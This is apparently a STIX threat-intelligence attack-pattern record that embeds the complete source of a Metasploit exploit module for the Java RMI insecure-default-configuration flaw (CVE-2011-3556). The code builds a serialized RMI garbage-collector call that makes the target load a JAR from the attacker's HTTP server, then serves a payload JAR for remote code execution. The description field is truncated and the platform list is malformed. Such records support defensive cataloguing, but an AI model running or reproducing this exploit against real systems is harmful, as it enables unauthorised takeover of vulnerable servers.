{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--449a3e13-0575-4024-8e54-a69956c1a66c",
    "created": "2024-08-14T17:06:51.740428Z",
    "modified": "2024-08-14T17:06:51.740433Z",
    "name": "Java RMI Server Insecure Default Configuration Java Code Execution",
    "description": " This module takes advantage of the default configuration of the RMI Registry and",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/java_rmi_server.rb",
            "external_id": "java_rmi_server.rb"
        },
        {
            "source_name": "reference",
            "url": "http://download.oracle.com/javase/1.3/docs/guide/rmi/spec/rmi-protocol.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.securitytracker.com/id?1026215"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3556"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Java::Rmi::Client\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::CheckModule\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Java RMI Server Insecure Default Configuration Java Code Execution',\n      'Description'    => %q{\n          This module takes advantage of the default configuration of the RMI Registry and\n        RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it\n        invokes a method in the RMI Distributed Garbage Collector which is available via every\n        RMI endpoint, it can be used against both rmiregistry and rmid,  and against most other\n        (custom) RMI endpoints as well.\n\n          Note that it does not work against Java Management Extension (JMX) ports since those do\n        not support remote class loading, unless another RMI endpoint is active in the same\n        Java process.\n\n          RMI method calls do not support or require any sort of authentication.\n      },\n      'Author'         => [ 'mihi' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          # RMI protocol specification\n          [ 'URL', 'http://download.oracle.com/javase/1.3/docs/guide/rmi/spec/rmi-protocol.html'],\n          [ 'URL', 'http://www.securitytracker.com/id?1026215'],\n          [ 'CVE', '2011-3556']\n        ],\n      'DisclosureDate' => '2011-10-15',\n      'Platform'       => %w{ java linux osx solaris win },\n      'Privileged'     => false,\n      'Payload'        => { 'BadChars' => '', 'DisableNops' => true },\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'DefaultOptions' =>\n        {\n          'CheckModule' => 'auxiliary/scanner/misc/java_rmi_server',\n          'WfsDelay' => 10\n        },\n      'Targets'        =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => ['java'],\n              'Arch' => ARCH_JAVA\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Mac OS X PPC (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_PPC,\n            }\n          ],\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0\n    ))\n    register_options([\n      Opt::RPORT(1099),\n      OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request',  10]),\n    ])\n    register_common_rmi_ports_and_services\n  end\n\n  def exploit\n    begin\n      Timeout.timeout(datastore['HTTPDELAY']) { super }\n    rescue Timeout::Error\n      # When the server stops due to our timeout, re-raise\n      # RuntimeError so it won't wait the full wfs_delay\n      raise ::RuntimeError, \"Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request\"\n    rescue Msf::Exploit::Failed\n      # When the server stops due primer failing,  re-raise\n      # RuntimeError so it won't wait the full wfs_delays\n      raise ::RuntimeError, \"Exploit aborted due to failure #{fail_reason} #{(fail_detail || \"No reason given\")}\"\n    rescue Rex::ConnectionTimeout, Rex::ConnectionRefused => e\n      # When the primer fails due to an error connecting with\n      # the rhost,  re-raise RuntimeError so it won't wait the\n      # full wfs_delays\n      raise ::RuntimeError, e.message\n    end\n  end\n\n  def primer\n    connect\n\n    print_status(\"Sending RMI Header...\")\n    send_header\n    ack = recv_protocol_ack\n    if ack.nil?\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to negotiate RMI protocol\")\n    end\n\n    jar = rand_text_alpha(rand(8)+1) + '.jar'\n    new_url = get_uri + '/' + jar\n\n    print_status(\"Sending RMI Call...\")\n    dgc_interface_hash = calculate_interface_hash(\n      [\n        {\n          name: 'clean',\n          descriptor: '([Ljava/rmi/server/ObjID;JLjava/rmi/dgc/VMID;Z)V',\n          exceptions: ['java.rmi.RemoteException']\n        },\n        {\n          name: 'dirty',\n          descriptor: '([Ljava/rmi/server/ObjID;JLjava/rmi/dgc/Lease;)Ljava/rmi/dgc/Lease;',\n          exceptions: ['java.rmi.RemoteException']\n        }\n      ]\n    )\n\n    # JDK 1.1 stub protocol\n    # Interface hash: 0xf6b6898d8bf28643 (sun.rmi.transport.DGCImpl_Stub)\n    # Operation: 0 (public void clean(ObjID[] paramArrayOfObjID, long paramLong, VMID paramVMID, boolean paramBoolean))\n    send_call(\n      object_number: 2,\n      uid_number: 0,\n      uid_time: 0,\n      uid_count: 0,\n      operation: 0,\n      hash: dgc_interface_hash,  # java.rmi.dgc.DGC interface hash\n      arguments: build_dgc_clean_args(new_url)\n    )\n\n    return_value = recv_return\n\n    if return_value.nil? && !session_created?\n      fail_with(Failure::Unknown,  'RMI Call failed')\n    end\n\n    if return_value && return_value.is_exception? && loader_disabled?(return_value)\n      fail_with(Failure::NotVulnerable,  'The RMI class loader is disabled')\n    end\n\n    if return_value && return_value.is_exception? && class_not_found?(return_value)\n      fail_with(Failure::Unknown,  'The RMI class loader couldn\\'t find the payload')\n    end\n\n    disconnect\n  end\n\n  def on_request_uri(cli,  request)\n    if request.uri =~ /\\.jar$/i\n      p = regenerate_payload(cli)\n      jar = p.encoded_jar\n      paths = [\n        [ \"metasploit\", \"RMILoader.class\" ],\n        [ \"metasploit\", \"RMIPayload.class\" ],\n      ]\n\n      jar.add_file('metasploit/', '') # create metasploit dir\n      paths.each do |path_parts|\n        path = ['java', path_parts].flatten.join('/')\n        contents = ::MetasploitPayloads.read(path)\n        jar.add_file(path_parts.join('/'), contents)\n      end\n\n      send_response(cli, jar.pack,\n      {\n        'Content-Type' => 'application/java-archive',\n        'Connection'   => 'close',\n        'Pragma'       => 'no-cache'\n      })\n\n      print_status(\"Replied to request for payload JAR\")\n      cleanup_service\n    end\n  end\n\n  def autofilter\n    return true\n  end\n\n  def loader_disabled?(return_value)\n    return_value.value.each do |exception|\n      if exception.class == Rex::Java::Serialization::Model::NewObject &&\n          exception.class_desc.description.class == Rex::Java::Serialization::Model::NewClassDesc &&\n          exception.class_desc.description.class_name.contents == 'java.lang.ClassNotFoundException'&&\n          [Rex::Java::Serialization::Model::NullReference, Rex::Java::Serialization::Model::Reference].include?(exception.class_data[0].class) &&\n          exception.class_data[1].contents.include?('RMI class loader disabled')\n        return true\n      end\n    end\n\n    false\n  end\n\n  def class_not_found?(return_value)\n    return_value.value.each do |exception|\n      if exception.class == Rex::Java::Serialization::Model::NewObject &&\n          exception.class_desc.description.class == Rex::Java::Serialization::Model::NewClassDesc &&\n          exception.class_desc.description.class_name.contents == 'java.lang.ClassNotFoundException'\n        return true\n      end\n    end\n\n    false\n  end\n\n  def build_dgc_clean_args(jar_url)\n    arguments = []\n\n    new_array_annotation = Rex::Java::Serialization::Model::Annotation.new\n    new_array_annotation.contents = [\n      Rex::Java::Serialization::Model::NullReference.new,\n      Rex::Java::Serialization::Model::EndBlockData.new\n    ]\n\n    new_array_super = Rex::Java::Serialization::Model::ClassDesc.new\n    new_array_super.description = Rex::Java::Serialization::Model::NullReference.new\n\n    new_array_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    new_array_desc.class_name =  Rex::Java::Serialization::Model::Utf.new(nil, '[Ljava.rmi.server.ObjID;')\n    new_array_desc.serial_version = 0x871300b8d02c647e\n    new_array_desc.flags = 2\n    new_array_desc.fields = []\n    new_array_desc.class_annotation = new_array_annotation\n    new_array_desc.super_class = new_array_super\n\n    array_desc = Rex::Java::Serialization::Model::ClassDesc.new\n    array_desc.description = new_array_desc\n\n    new_array = Rex::Java::Serialization::Model::NewArray.new\n    new_array.type = 'java.rmi.server.ObjID;'\n    new_array.values = []\n    new_array.array_description = array_desc\n\n    arguments << new_array\n    arguments << Rex::Java::Serialization::Model::BlockData.new(nil,  \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")\n\n    new_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    new_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'metasploit.RMILoader')\n    new_class_desc.serial_version = 0xa16544ba26f9c2f4\n    new_class_desc.flags = 2\n    new_class_desc.fields = []\n    new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    new_class_desc.class_annotation.contents = [\n      Rex::Java::Serialization::Model::Utf.new(nil, jar_url),\n      Rex::Java::Serialization::Model::EndBlockData.new\n    ]\n    new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new\n\n    new_object = Rex::Java::Serialization::Model::NewObject.new\n    new_object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new\n    new_object.class_desc.description = new_class_desc\n    new_object.class_data = []\n\n    arguments << new_object\n\n    arguments << Rex::Java::Serialization::Model::BlockData.new(nil, \"\\x00\")\n\n    arguments\n  end\nend\n",
    "x_mitre_contributors": [
        "[ mihi ]",
        ""
    ],
    "x_mitre_disclosure_date": "2011-10-15",
    "x_mitre_platforms": [
        "osx'"
    ]
}